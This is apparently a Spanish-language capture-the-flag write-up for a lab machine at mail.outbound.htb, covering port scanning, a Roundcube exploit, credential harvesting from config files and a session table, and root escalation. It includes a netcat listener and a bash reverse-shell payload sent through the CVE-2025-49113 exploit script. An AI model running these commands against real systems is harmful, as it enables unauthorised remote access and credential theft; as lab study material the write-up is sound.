@@ -1,0 +1,41 @@
+Escaneo de puertos con nmap>
+22,80\tcp abiertos
+
+credenciales:
+usuario: tyler 
+contrasenaa: LhKL1o9Nm3X2
+
+En el puerto 80 hay una pagina web de un servico de correo electronico donde se puede iniciar sesion con las credenciales de tyler
+
+al revisar la verion del servicio encontramos que hay un cve el cual es el siguinte CVE-2025-49113, el cual nos permite crear un reverse shell, usando el siguinte comando.
+
+nc -lnvp <puerto>
+
+php CVE-2025–49113.php http://mail.outbound.htb <username> <password> “bash -c ‘bash -i >& /dev/tcp/<your_ip_address>/<puerto> 0>&1’”
+
+una vez inicada la sesion encontre que en la carpeta de config habia un archvio con las credenciales para inciar sesion en un servidor sql
+
+usuario: roundcube
+pass: RCDBPass2025
+DB: roundcube
+
+Comando usaso: mysql -u roundcube -pRCDBPass2025 roundcube -e "<Comando sql>"
+
+uan vez ejecutado los coamandos encontre que en la tabla session habia unos datos codificado en base 64 los cuales decifre y contenian los siguinte
+
+username|s:5:"jacob"
+password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
+auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW"
+
+despues de esto encontre una manera de decifrar la contrase;a por lo cual al investigar encontre que dentro de la carpeta bin habia una herramienta que te ayudaba a hacer el decrypt
+
+usuario: jacob
+pass_dc: 595mO8DmwGeD
+
+una vez obtenida la contrasena de jacob intente incier sesion en ssh con ella, no lo logre pero si logre entrar a su correo en el cual encontre dos correos en el cual en uno comentaba que al usuario de jacb le habia dado privilegios para poder monitorear y en el otro nos decian que habian cambaido las contrasenas de los usuarios y en el venia la contrasena de jacob para lo que supuse que era sus credenciales para incier sesion por ssh
+
+usuario: jacob
+contra: gY4Wr3a1evp4
+
+al inicar sesion ecnontre la user flag y un .sh en el cual nos permite crear un usuario con privilegios root pero al ejecutar ese archivo me daba error el cual no me permitia crear el usuario por lo cual me puse a investigar sobre el cve-2025-27591 que es el que nos permite crear el archivo root y encontre el como se explotaba la vulnerbalidad y un script en python de como se explotaba la vulnerbilidad, una vez explotada la vulnerabilidad ecnontre la root flag y pude terminar la maquina
+
